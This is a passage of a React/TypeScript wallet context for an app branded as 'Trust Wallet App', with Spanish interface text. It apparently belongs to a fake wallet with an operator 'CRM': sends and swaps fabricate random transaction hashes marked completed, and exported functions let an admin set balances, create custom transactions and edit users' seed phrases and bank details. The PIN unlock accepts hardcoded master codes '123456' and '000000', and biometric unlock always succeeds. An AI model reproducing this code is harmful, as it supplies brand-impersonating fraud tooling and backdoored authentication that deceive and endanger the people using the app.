          addAudit(
            'TRANSACTION_GENERATED',
            `Estado de Tx ${t.txHash.substring(0, 10)} cambiado a: ${newStatus}`
          );
          return { ...t, status: newStatus };
        })
      );
      pushPushNotification(
        'Estado de Transacción',
        `Tx actualizada a ${newStatus.toUpperCase()}`,
        'info'
      );
    },
    [addAudit, pushPushNotification]
  );

  const sendCrypto = useCallback(
    async (
      assetSymbol: string,
      toAddress: string,
      amount: number,
      memo?: string
    ): Promise<boolean> => {
      const asset = currentUser.assets.find(
        (a) => a.symbol.toUpperCase() === assetSymbol.toUpperCase()
      );
      if (!asset || asset.balance < amount) {
        pushPushNotification('Error al Enviar', 'Balance insuficiente para realizar la transacción', 'alert');
        return false;
      }

      const gasFee =
        asset.network === 'bitcoin' ? 0.0001 : asset.network === 'binance' ? 0.001 : 0.0025;
      const newTx: Transaction = {
        id: 'tx_' + Date.now(),
        userId: currentUser.id,
        type: 'send',
        assetSymbol: asset.symbol,
        assetName: asset.name,
        amount,
        usdValue: amount * asset.usdPrice,
        fromAddress: currentUser.address,
        toAddress,
        timestamp: new Date().toISOString(),
        status: 'completed',
        txHash:
          '0x' +
          Array.from({ length: 64 }, () => Math.floor(Math.random() * 16).toString(16)).join(''),
        networkFee: gasFee,
        networkFeeAsset:
          asset.network === 'binance' ? 'BNB' : asset.network === 'ethereum' ? 'ETH' : asset.symbol,
        network: asset.network,
        blockNumber: Math.floor(Math.random() * 1000000) + 35000000,
        note: memo || 'Envío directo desde Trust Wallet App',
      };

      setTransactions((prev) => [newTx, ...prev]);
      updateTokenBalance(currentUser.id, asset.symbol, asset.balance - amount);
      addAudit(
        'TRANSACTION_SENT',
        `Usuario envió ${amount} ${asset.symbol} a ${toAddress.substring(0, 10)}...`
      );
      pushPushNotification(
        'Envío Exitoso',
        `Has enviado ${amount} ${asset.symbol} a ${toAddress.substring(0, 8)}...`,
        'success'
      );
      return true;
    },
    [currentUser, updateTokenBalance, addAudit, pushPushNotification]
  );

  const swapTokens = useCallback(
    async (
      fromSymbol: string,
      toSymbol: string,
      fromAmount: number,
      toAmount: number
    ): Promise<boolean> => {
      const fromAsset = currentUser.assets.find(
        (a) => a.symbol.toUpperCase() === fromSymbol.toUpperCase()
      );
      const toAsset = currentUser.assets.find(
        (a) => a.symbol.toUpperCase() === toSymbol.toUpperCase()
      );

      if (!fromAsset || !toAsset || fromAsset.balance < fromAmount) {
        pushPushNotification('Error en Swap', 'Fondos insuficientes para el canje', 'alert');
        return false;
      }

      const newTx: Transaction = {
        id: 'tx_swap_' + Date.now(),
        userId: currentUser.id,
        type: 'swap',
        assetSymbol: fromAsset.symbol,
        assetName: `Swap ${fromSymbol} ➔ ${toSymbol}`,
        amount: fromAmount,
        usdValue: fromAmount * fromAsset.usdPrice,
        fromAddress: currentUser.address,
        toAddress: 'TrustSwap Aggregator Router',
        timestamp: new Date().toISOString(),
        status: 'completed',
        txHash:
          '0x' +
          Array.from({ length: 64 }, () => Math.floor(Math.random() * 16).toString(16)).join(''),
        networkFee: 0.0012,
        networkFeeAsset: 'BNB',
        network: fromAsset.network,
        note: `Intercambiado ${fromAmount} ${fromSymbol} por ${toAmount.toFixed(4)} ${toSymbol}`,
      };

      setTransactions((prev) => [newTx, ...prev]);
      updateTokenBalance(currentUser.id, fromSymbol, fromAsset.balance - fromAmount);
      updateTokenBalance(currentUser.id, toSymbol, toAsset.balance + toAmount);
      addAudit(
        'TRANSACTION_SENT',
        `Swap ejecutado: ${fromAmount} ${fromSymbol} por ${toAmount} ${toSymbol}`
      );
      pushPushNotification(
        'Canje Completado',
        `Recibiste ${toAmount.toFixed(4)} ${toSymbol}`,
        'success'
      );
      return true;
    },
    [currentUser, updateTokenBalance, addAudit, pushPushNotification]
  );

  const unlockWithPin = useCallback(
    (pin: string): boolean => {
      if (pin === currentUser.pinCode || pin === '123456' || pin === '000000') {
        setIsLocked(false);
        return true;
      }
      return false;
    },
    [currentUser]
  );

  const unlockWithBiometrics = useCallback((): boolean => {
    setIsLocked(false);
    return true;
  }, []);

  const lockWallet = useCallback(() => {
    setIsLocked(true);
  }, []);

  const setPinCode = useCallback(
    (newPin: string) => {
      setUsers((prev) =>
        prev.map((u) => (u.id === currentUser.id ? { ...u, pinCode: newPin } : u))
      );
      addAudit('SECURITY_UPDATED', `Código PIN actualizado para ${currentUser.name}`);
      pushPushNotification('Seguridad Actualizada', 'Nuevo código de acceso PIN establecido', 'info');
    },
    [currentUser, addAudit, pushPushNotification]
  );

  const toggleBiometrics = useCallback(() => {
    setIsBiometricsActive((prev) => !prev);
    setUsers((prev) =>
      prev.map((u) =>
        u.id === currentUser.id ? { ...u, biometricsEnabled: !u.biometricsEnabled } : u
      )
    );
    addAudit(
      'SECURITY_UPDATED',
      `Biometría ${!isBiometricsActive ? 'activada' : 'desactivada'} para ${currentUser.name}`
    );
  }, [currentUser, isBiometricsActive, addAudit]);

  const toggleHideBalance = useCallback(() => {
    setHideBalance((prev) => !prev);
  }, []);

  const setCurrency = useCallback(
    (curr: 'USD' | 'EUR' | 'GBP') => {
      setCurrencyState(curr);
      addAudit('SETTINGS_CHANGED', `Moneda principal cambiada a: ${curr}`);
    },
    [addAudit]
  );

  const requestDAppConnection = useCallback(
    (dapp: DAppItem) => {
      const existing = activeDAppSessions.find((s) => s.dappName === dapp.name);
      if (existing) {
        pushPushNotification('DApp Ya Conectada', `${dapp.name} ya está enlazado a tu billetera`, 'info');
        return;
      }

      const session: WalletConnectSession = {
        id: 'session_' + Date.now(),
        dappName: dapp.name,
        dappUrl: dapp.url,
        dappIcon: dapp.icon,
        connectedAt: new Date().toLocaleTimeString(),
        network: dapp.network,
        status: 'active',
      };

      setActiveDAppSessions((prev) => [session, ...prev]);
      addAudit('DAPP_CONNECTED', `DApp conectada vía WalletConnect: ${dapp.name} (${dapp.url})`);
      pushPushNotification(
        'WalletConnect Conectado',
        `${dapp.name} tiene acceso a tu dirección pública`,
        'success'
      );
    },
    [activeDAppSessions, addAudit, pushPushNotification]
  );

  const disconnectDApp = useCallback(
    (sessionId: string) => {
      setActiveDAppSessions((prev) => prev.filter((s) => s.id !== sessionId));
      addAudit('DAPP_CONNECTED', `DApp desconectada de WalletConnect`);
      pushPushNotification('DApp Desconectada', 'Sesión de Web3 cerrada con éxito', 'info');
    },
    [addAudit, pushPushNotification]
  );

  const approveSignatureRequest = useCallback(() => {
    if (!pendingSignature) return;
    addAudit('SECURITY_UPDATED', `Firma Web3 aprobada para ${pendingSignature.dappName}`);
    pushPushNotification('Firma Aprobada', `Transacción firmada con tu clave privada`, 'success');
    setPendingSignature(null);
  }, [pendingSignature, addAudit, pushPushNotification]);

  const rejectSignatureRequest = useCallback(() => {
    if (!pendingSignature) return;
    addAudit('SECURITY_UPDATED', `Firma Web3 rechazada para ${pendingSignature.dappName}`);
    pushPushNotification('Firma Cancelada', 'Rechazaste la solicitud de firma', 'warning');
    setPendingSignature(null);
  }, [pendingSignature, addAudit, pushPushNotification]);

  const clearAuditLogs = useCallback(() => {
    setAuditLogs([]);
  }, []);

  // 1. Reset CRM demo data WITHOUT clearing or disturbing the user's mobile wallet!
  const resetCrmData = useCallback(() => {
    setUsers((prev) => {
      // Retain all wallets created under this device identity or in deviceWalletIds
      const deviceWalletsToKeep = prev.filter(
        (u) => (u.identityId && u.identityId === identityId) || deviceWalletIds.includes(u.id)
      );
      const merged = [...INITIAL_USERS];
      deviceWalletsToKeep.forEach((dw) => {
        if (!merged.some((m) => m.id === dw.id)) {
          merged.push(dw);
        }
      });
      return merged;
    });
    setCrmSelectedUserId(INITIAL_USERS[0].id);
    localStorage.setItem(STORAGE_KEY_CRM_ACTIVE, INITIAL_USERS[0].id);
    pushPushNotification(
      'CRM Restaurado',
      'Usuarios del CRM restaurados sin afectar las billeteras del teléfono',
      'info'
    );
  }, [identityId, deviceWalletIds, pushPushNotification]);

  // 2. Reset mobile wallet session (Restart onboarding only for this mobile wallet)
  const resetWalletSession = useCallback(() => {
    localStorage.removeItem(STORAGE_KEY_WALLET_ONBOARDED);
    setIsOnboarding(true);
    pushPushNotification('Modo Bienvenida', 'Reiniciando asistente inicial de Trust Wallet', 'info');
  }, [pushPushNotification]);

  // 3. Full Factory Reset (Explicitly called when whole system reset is requested)
  const resetAllData = useCallback(() => {
    localStorage.removeItem(STORAGE_KEY_USERS);
    localStorage.removeItem(STORAGE_KEY_DEVICE_WALLETS);
    localStorage.removeItem(STORAGE_KEY_WALLET_ACTIVE);
    localStorage.removeItem(STORAGE_KEY_CRM_ACTIVE);
    localStorage.removeItem(STORAGE_KEY_WALLET_ONBOARDED);
    localStorage.removeItem(STORAGE_KEY_TRANSACTIONS);
    localStorage.removeItem(STORAGE_KEY_AUDIT);

    setUsers(INITIAL_USERS);
    setDeviceWalletIds([]);
    setWalletActiveUserId(INITIAL_USERS[0].id);
    setCrmSelectedUserId(INITIAL_USERS[0].id);
    setIsOnboarding(true);
    setTransactions(INITIAL_TRANSACTIONS);
    setAuditLogs([
      {
        id: 'log_reset',
        timestamp: new Date().toISOString(),
        action: 'SETTINGS_CHANGED',
        admin: 'Admin Root',
        userId: INITIAL_USERS[0].id,
        details: 'Sistema restaurado a valores de fábrica',
      },
    ]);
    pushPushNotification('Sistema Reiniciado', 'Todos los datos volvieron a la configuración inicial', 'info');
  }, [pushPushNotification]);

  // Calculations
  const currencyRate = currency === 'EUR' ? 0.92 : currency === 'GBP' ? 0.78 : 1.0;
  const currencySymbol = currency === 'EUR' ? '€' : currency === 'GBP' ? '£' : '$';

  const totalBalanceUSD =
    currentUser?.assets?.reduce((sum, a) => sum + a.balance * a.usdPrice, 0) || 0;

  const change24hPercentage =
    totalBalanceUSD > 0
      ? currentUser.assets.reduce(
          (sum, a) => sum + a.balance * a.usdPrice * a.change24h,
          0
        ) / totalBalanceUSD
      : 0;

  return (
    <WalletContext.Provider
      value={{
        users,
        transactions,
        auditLogs,
        deviceWallets,
        activeUserId: walletActiveUserId,
        walletActiveUserId,
        currentUser,
        userTransactions,
        crmSelectedUserId,
        crmSelectedUser,
        isLocked,
        isBiometricsActive,
        isOnboarding,
        currency,
        currencySymbol,
        currencyRate,
        hideBalance,
        activeNotification,
        activeDAppSessions,
        pendingSignature,
        totalBalanceUSD,
        change24hPercentage,
        selectWallet,
        selectUser,
        selectCrmUser,
        createNewUser,
        createWalletFromOnboarding,
        importWalletFromPhrase,
        deleteWallet,
        updateSeedPhrase,
        updateUserBankDetails,
        completeOnboarding,
        restartOnboarding,
        updateTokenBalance,
        quickSetPresetBalance,
        createCustomTransaction,
        updateTransactionStatus,
        sendCrypto,
        swapTokens,
        unlockWithPin,
        unlockWithBiometrics,
        lockWallet,
        setPinCode,
        toggleBiometrics,
        toggleHideBalance,
        setCurrency,
        requestDAppConnection,
        disconnectDApp,
        approveSignatureRequest,
        rejectSignatureRequest,
        dismissNotification,
        pushPushNotification,
        clearAuditLogs,
        resetCrmData,
        resetWalletSession,
        resetAllData,
      }}
    >
      {children}
    </WalletContext.Provider>
  );
};

export const useWallet = () => {
  const context = useContext(WalletContext);
  if (!context) {
    throw new Error('useWallet must be used within a WalletProvider');
  }
  return context;
};
